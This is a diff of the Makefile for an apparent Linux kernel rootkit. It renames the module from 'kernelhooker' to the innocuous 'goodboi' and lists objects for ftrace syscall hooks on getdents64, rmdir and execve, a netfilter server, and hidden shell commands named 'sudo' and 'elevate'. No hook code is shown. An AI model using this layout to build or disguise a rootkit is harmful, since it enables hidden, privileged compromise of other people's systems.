@@ -1,5 +1,5 @@
-MODULE_NAME := kernelhooker
-PROD_MODULE_NAME := prod.kernelhooker
+MODULE_NAME := goodboi
+PROD_MODULE_NAME := prod.goodboi
 
 ####################################################
 ####################################################
@@ -8,7 +8,7 @@ SRC_DIR := src
 BUILD_DIR := build
 DIST_DIR := dist
 
-BASE_OBJS := src/inc/ftrace/ftrace_helper.o src/inc/logger/logger.o src/inc/hooks/utils.o src/inc/hooks/getdents64/getdents64.o src/inc/hooks/rmdir/rmdir.o src/inc/hooks/execve/execve.o src/inc/shell/dispatcher.o src/inc/shell/parser/parser.o src/inc/shell/commands/sudo/sudo.o src/inc/shell/commands/version/version.o src/inc/shell/commands/elevate/elevate.o src/entry.o
+BASE_OBJS := src/inc/ftrace/ftrace_helper.o src/inc/logger/logger.o src/inc/hooks/utils.o src/inc/hooks/syscall/execve/execve.o src/inc/hooks/syscall/getdents64/getdents64.o src/inc/hooks/syscall/rmdir/rmdir.o src/inc/hooks/netfilter/server/server.o src/inc/shell/dispatcher.o src/inc/shell/parser/parser.o src/inc/shell/commands/sudo/sudo.o src/inc/shell/commands/version/version.o src/inc/shell/commands/elevate/elevate.o src/entry.o 
 
 ####################################################
 
@@ -19,7 +19,7 @@ $(MODULE_NAME)-objs := $(BASE_OBJS)
 ####################################################
 
 KBUILD_CFLAGS += -DDEBUG=1 \
-    -DRK_VERSION='"1752421246:adba006"'
+    -DRK_VERSION='"1752440852:1ebe040"'
 
 ####################################################
 ####################################################
